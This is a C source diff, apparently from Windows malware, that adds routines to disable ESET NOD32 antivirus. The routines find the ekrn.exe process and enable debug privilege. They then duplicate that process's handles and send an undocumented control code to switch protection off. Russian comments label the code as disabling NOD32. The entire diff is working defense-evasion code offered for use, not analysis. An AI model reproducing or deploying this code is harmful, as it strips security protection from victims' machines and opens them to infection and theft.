@@ -3080,3 +3080,110 @@ void KillBlockingProcesses( const char* fileName )
 		};
 	};	
 }
+
+DWORD GetProcessIdByName(PCHAR ProcessName)
+{
+	DWORD Result = NULL;
+	PROCESSENTRY32 ProcessEntry = {0};
+	HANDLE hSnap;
+
+	hSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnap != INVALID_HANDLE_VALUE)
+	{
+		ProcessEntry.dwSize = sizeof(ProcessEntry);
+		if (pProcess32First(hSnap, &ProcessEntry))
+		{
+			do 
+			{
+				if (!m_lstrcmp(ProcessName, ProcessEntry.szExeFile))
+				{
+					Result = ProcessEntry.th32ProcessID;
+					break;
+				}
+			}
+			while (pProcess32Next(hSnap, &ProcessEntry));
+		}
+
+		pCloseHandle(hSnap);
+	}
+
+	return Result;
+}
+
+//Отключение NOD32
+static VOID SendCmdOffNOD32(PVOID hObject)
+{
+	IO_STATUS_BLOCK StatusBlock;
+	UCHAR Buff[0x4] = {0x01, 0x00, 0x00, 0x00};
+
+	NtDeviceIoControlFile(hObject, NULL, NULL, NULL, &StatusBlock, 0x88770034, Buff, sizeof(Buff), Buff, sizeof(Buff));
+
+	/*IO_STATUS_BLOCK StatusBlock;
+	UCHAR Buff[0x4] = {0x0};
+
+	NtDeviceIoControlFile(hObject, NULL, NULL, NULL, &StatusBlock, 0x88770034, 0, 0, Buff, sizeof(Buff));*/
+}
+
+static PVOID GetSystemInformation(SYSTEM_INFORMATION_CLASS dwInfoClass)
+{
+	NTSTATUS St;
+	DWORD dwSize = 1000;
+	PVOID pvInfo = NULL;
+
+	do
+	{
+		pvInfo = MemAlloc(dwSize);
+		if (!pvInfo) return NULL;
+
+		St = (NTSTATUS)pNtQuerySystemInformation(dwInfoClass, pvInfo, dwSize, NULL); 
+		if (!NT_SUCCESS(St))
+		{
+			MemFree(pvInfo);
+
+			dwSize += 1000;
+			pvInfo = NULL;
+		}
+	} 
+	while (St == STATUS_INFO_LENGTH_MISMATCH);
+
+	return pvInfo;
+}
+
+//Отключает НОД32
+VOID OffNOD32()
+{	
+	BOOL bRet = FALSE;
+	BOOLEAN bEnable;
+
+	pRtlAdjustPrivilege(SE_DEBUG_PRIVILEGE,TRUE,FALSE,&bEnable);
+
+	DWORD dwPid = GetProcessIdByName("ekrn.exe");
+	if (dwPid)
+	{
+		HANDLE hProcess = pOpenProcess(PROCESS_DUP_HANDLE|PROCESS_QUERY_INFORMATION, FALSE, dwPid);
+		if (hProcess != INVALID_HANDLE_VALUE)
+		{
+			PVOID PvInfo = GetSystemInformation(SystemHandleInformation);
+			if (PvInfo)
+			{
+				PSYSTEM_HANDLE_INFORMATION pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)PvInfo;
+				for (DWORD dwIdx = 0; dwIdx < pHandleInfo->uCount; dwIdx++)
+				{
+					if (pHandleInfo->aSH[dwIdx].uIdProcess == dwPid)
+					{
+						HANDLE hObject = NULL;
+						if (pDuplicateHandle(hProcess, (HANDLE)pHandleInfo->aSH[dwIdx].Handle, NtCurrentProcess(), &hObject, DUPLICATE_SAME_ACCESS, FALSE, DUPLICATE_SAME_ACCESS) != FALSE)
+						{
+							RunThread( SendCmdOffNOD32, hObject );
+							pCloseHandle(hObject);
+						}
+					}
+				}
+
+				MemFree(PvInfo);
+			}
+
+			pCloseHandle(hProcess);
+		}
+	}
+}
